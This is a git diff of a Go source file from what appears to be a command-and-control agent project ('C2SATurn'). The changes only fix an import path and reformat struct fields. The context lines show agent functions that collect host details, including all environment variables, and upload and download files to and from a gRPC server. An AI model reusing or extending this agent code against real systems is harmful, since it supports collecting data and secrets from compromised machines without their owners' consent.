@@ -12,7 +12,7 @@ import (
 	"strings"
 	"time"
 
-	"github.com/yourusername/c2SATurn/grpcapi" // Adjust the import path to your actual project structure
+	"github.com/h3bzzz/C2SATurn/grpcapi"
 	"google.golang.org/grpc"
 )
 
@@ -90,10 +90,10 @@ func handleSysInfo(ctx context.Context, client grpcapi.AgentClient) {
 	uptime, _ := exec.Command("uptime").Output()
 
 	sysInfo := &grpcapi.SystemInfo{
-		Hostname: hostname,
-		OS:       osInfo,
-		Architecture: arch,
-		Uptime:   string(uptime),
+		Hostname:             hostname,
+		OS:                   osInfo,
+		Architecture:         arch,
+		Uptime:               string(uptime),
 		EnvironmentVariables: map[string]string{},
 	}
 	for _, env := range os.Environ() {
@@ -151,8 +151,8 @@ func uploadFile(ctx context.Context, client grpcapi.AgentClient, filePath string
 		}
 
 		chunk := &grpcapi.FileChunk{
-			Data:      buffer[:n],
-			FileName:  filePath,
+			Data:        buffer[:n],
+			FileName:    filePath,
 			ChunkNumber: int64(1), // Adjust for actual chunking
 		}
 
@@ -190,4 +190,3 @@ func downloadFile(ctx context.Context, client grpcapi.AgentClient, fileName stri
 		log.Println("Error saving file:", err)
 	}
 }
-
